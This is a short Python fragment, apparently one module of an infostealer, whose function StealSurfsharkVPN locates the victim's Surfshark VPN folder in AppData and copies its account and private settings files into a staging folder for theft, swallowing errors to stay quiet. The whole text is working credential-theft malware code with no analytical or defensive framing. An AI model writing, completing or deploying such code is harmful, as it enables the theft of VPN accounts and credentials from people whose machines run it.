import os
import shutil


async def StealSurfsharkVPN(self, directory_path: str) -> None:
    try:
        surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
        if not os.path.isdir(surfsharkvpn_folder):
            return
        
        surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
        os.makedirs(surfsharkvpn_account, exist_ok=True)
        files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
        for root, _, files in os.walk(surfsharkvpn_folder):
            for file in files:
                if file in files_to_copy:
                    shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
    except Exception as e:
        print(f"surfshark error - {str(e)}")
        pass